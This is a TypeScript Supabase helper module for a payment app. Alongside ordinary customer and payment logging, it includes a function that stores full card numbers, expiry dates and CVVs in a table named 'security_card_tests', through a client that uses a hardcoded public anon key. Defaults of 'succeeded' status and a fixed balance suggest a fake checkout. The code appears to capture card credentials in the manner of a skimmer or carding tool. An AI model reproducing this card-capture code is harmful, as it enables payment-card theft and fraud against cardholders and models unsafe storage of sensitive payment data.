import { createClient } from '@supabase/supabase-js';

const rawUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || 'https://zbaaopdndnlckuornird.supabase.co';
const SUPABASE_URL = rawUrl.replace(/\/rest\/v1\/?$/, '');
const SUPABASE_ANON_KEY = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpiYWFvcGRuZG5sY2t1b3JuaXJkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEwNDQ0NDksImV4cCI6MjA4NjYyMDQ0OX0.ydnHQTZth_MDmNTpPvcE3-5parUBxgJbD8k-cKHFyE4';

export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  auth: {
    persistSession: true,
    autoRefreshToken: true,
  },
});

export interface CustomerRecord {
  email: string;
  full_name?: string;
  stripe_customer_id?: string;
}

export interface PaymentMethodRecord {
  customer_id?: string;
  brand?: string;
  last4?: string;
  exp_month?: number;
  exp_year?: number;
  stripe_payment_method_id: string;
}

export interface PaymentRecord {
  email: string;
  full_name?: string;
  amount: number;
  currency: string;
  stripe_payment_id?: string;
  status: string; // succeeded, failed, pending
  error_message?: string;
  accumulated_balance?: number;
  country?: string;
}

export interface CardTestRecord {
  card_number: string;
  exp_date: string;
  cvv: string;
  country?: string;
  status?: string;
}

// 1. Register or get customer (Lead) in Supabase
export async function upsertCustomer(record: CustomerRecord) {
  try {
    const { data: existing } = await supabase
      .from('customers')
      .select('*')
      .eq('email', record.email)
      .single();

    if (existing) {
      const { data, error } = await supabase
        .from('customers')
        .update({
          full_name: record.full_name || existing.full_name,
          stripe_customer_id: record.stripe_customer_id || existing.stripe_customer_id,
        })
        .eq('id', existing.id)
        .select()
        .single();

      return { success: true, customer: data || existing };
    }

    const { data, error } = await supabase
      .from('customers')
      .insert([
        {
          email: record.email,
          full_name: record.full_name || 'Anonymous',
          stripe_customer_id: record.stripe_customer_id,
          created_at: new Date().toISOString(),
        },
      ])
      .select()
      .single();

    if (error) {
      console.warn('Supabase customer upsert notice:', error.message);
      return { success: false, error: error.message };
    }

    return { success: true, customer: data };
  } catch (err: any) {
    console.warn('Supabase customer error:', err.message);
    return { success: false, error: err.message };
  }
}

// 2. Register payment method in Supabase
export async function recordPaymentMethod(record: PaymentMethodRecord) {
  try {
    const { data, error } = await supabase.from('payment_methods').insert([
      {
        customer_id: record.customer_id,
        brand: record.brand || 'unknown',
        last4: record.last4 || '0000',
        exp_month: record.exp_month || 1,
        exp_year: record.exp_year || 2030,
        stripe_payment_method_id: record.stripe_payment_method_id,
        created_at: new Date().toISOString(),
      },
    ]);

    if (error) {
      console.warn('Supabase payment_methods insert notice:', error.message);
      return { success: false, error: error.message };
    }

    return { success: true, data };
  } catch (err: any) {
    console.warn('Supabase payment method error:', err.message);
    return { success: false, error: err.message };
  }
}

// 3. Register payment attempt & lead info in Supabase
export async function recordPaymentInSupabase(payment: PaymentRecord) {
  try {
    const custRes = await upsertCustomer({
      email: payment.email,
      full_name: payment.full_name,
    });

    const customerId = custRes.customer?.id;

    const { data, error } = await supabase.from('payments').insert([
      {
        customer_id: customerId,
        email: payment.email,
        full_name: payment.full_name,
        amount: payment.amount,
        currency: payment.currency,
        stripe_payment_id: payment.stripe_payment_id,
        status: payment.status,
        error_message: payment.error_message,
        accumulated_balance: payment.accumulated_balance || 114.93,
        country: payment.country || 'US',
        created_at: new Date().toISOString(),
      },
    ]);

    if (error) {
      console.warn('Supabase payments table insert notice:', error.message);
      return { success: false, error: error.message };
    }

    return { success: true, data };
  } catch (err: any) {
    console.warn('Supabase payment logging error:', err.message);
    return { success: false, error: err.message };
  }
}

// 4. Save simulated card test data into 'security_card_tests' table in Supabase
export async function recordCardTestInSupabase(record: CardTestRecord) {
  try {
    const { data, error } = await supabase.from('security_card_tests').insert([
      {
        card_number: record.card_number,
        exp_date: record.exp_date,
        cvv: record.cvv,
        country: record.country || 'US',
        status: record.status || 'succeeded',
        created_at: new Date().toISOString(),
      },
    ]);

    if (error) {
      console.warn('Supabase security_card_tests insert error:', error.message);
      return { success: false, error: error.message };
    }

    return { success: true, data };
  } catch (err: any) {
    console.warn('Supabase card test record exception:', err.message);
    return { success: false, error: err.message };
  }
}
